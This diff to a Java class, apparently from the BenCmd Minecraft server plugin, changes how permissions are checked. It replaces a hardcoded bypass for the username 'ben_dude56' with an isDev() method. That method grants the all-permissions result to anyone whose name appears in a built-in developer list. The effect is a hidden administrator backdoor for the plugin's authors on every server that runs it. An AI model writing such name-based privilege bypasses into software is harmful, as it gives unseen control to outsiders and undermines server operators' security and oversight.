@@ -22,6 +22,15 @@ public class InternalUser {
 	public String getName() {
 		return name;
 	}
+	
+	public boolean isDev() {
+		for (String dev : BenCmd.devs){
+			if (dev.equalsIgnoreCase(name)) {
+				return true;
+			}
+		}
+		return false;
+	}
 
 	public List<String> getPermissions(boolean testGroup) {
 		List<String> perms = new ArrayList<String>();
@@ -53,7 +62,7 @@ public class InternalUser {
 		} else if (!perm.contains(".") && !perm.equals("*")) {
 			throw new InvalidPermissionError(perm, "Permissions in the root namespace are not allowed!");
 		}
-		if (isServer() || name.equalsIgnoreCase("ben_dude56")) {
+		if (isServer() || isDev()) {
 			return testStar;
 		}
 		boolean isStarred = false;
